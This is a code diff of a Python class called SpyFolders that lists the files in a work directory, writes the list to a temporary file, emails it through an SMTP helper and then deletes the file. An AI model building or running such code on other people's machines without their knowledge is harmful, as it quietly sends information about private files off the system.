@@ -20,20 +20,29 @@ class SpyFolders():
 
     def main(self):
         os.chdir("d:"+os.sep+"work")
+        filename = "d:/dircontents.txt"
         files = self.get_files_list_from_dir(os.getcwd())
-        send_contents = "".join(files)
-        mail_smtp.send_smtp_message("files list",send_contents)
-        '''
-        for item in files:
-            print (item)
-        pass
-        '''
+        with open(filename,"a") as f:
+            f.seek(0,0)
+            for item in files:
+                f.write('%s\n'%(item))
+                
+        mail_smtp.send_smtp_message("files list","files list",filename)
+        if os.path.exists(filename):
+            os.remove(filename)
 
     def get_files(self):
         os.chdir("d:"+os.sep+"work")
+        filename = "d:/dircontents.txt"
         files = self.get_files_list_from_dir(os.getcwd())
-        send_contents = "".join(files)
-        mail_smtp.send_smtp_message("files list",send_contents)
+        with open(filename,"a") as f:
+            f.seek(0,0)
+            for item in files:
+                f.write('%s\n'%(item))
+                
+        mail_smtp.send_smtp_message("files list","files list",filename)
+        if os.path.exists(filename):
+            os.remove(filename)
         
         
 
